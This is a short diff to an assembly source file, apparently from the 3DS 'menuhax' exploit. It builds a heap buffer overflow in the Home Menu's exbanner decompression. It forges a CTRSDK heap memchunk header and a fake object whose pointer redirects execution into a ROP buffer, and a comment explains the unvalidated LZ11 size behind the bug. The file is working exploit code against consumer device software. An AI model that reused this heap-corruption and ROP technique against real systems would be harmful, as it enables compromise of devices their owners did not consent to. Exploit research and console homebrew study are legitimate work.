@@ -57,5 +57,19 @@ ropstackstart:
 #include "menuhax_loader.s"
 
 @ When decompressing exbanners from the BOSS CBMD, Home Menu doesn't validate the decompressed-size from the LZ11 header. The buffer size is 0x20224-bytes. Hence, the below triggers a buffer overflow. Only the last word here actually triggers a crash when invalid, or at least immediately.
-.fill (((_start + 0x20224+0x24) - .) / 4), 4, ROPBUFLOC(object+0x20)
+.space ((_start + 0x20224) - .)
+
+@ Start of DU memchunk(CTRSDK-heap memchunkhdr for allocated mem).
+.word 0x5544 @ magicnum
+.word 0x50 @ size
+.word ROPBUF-0x10 @ prev memchunk
+.word ROPBUF+0x20224+0x10+0x50 @ next memchunk
+
+@ Start of the allocated mem.
+.word 0 @ vtable ptr
+.word 0 @ .data/.bss ptr
+.word 0 @ regular-heap ptr
+.word 0 @ Actually zero in the original data.
+
+.word ROPBUFLOC(object+0x20)
 
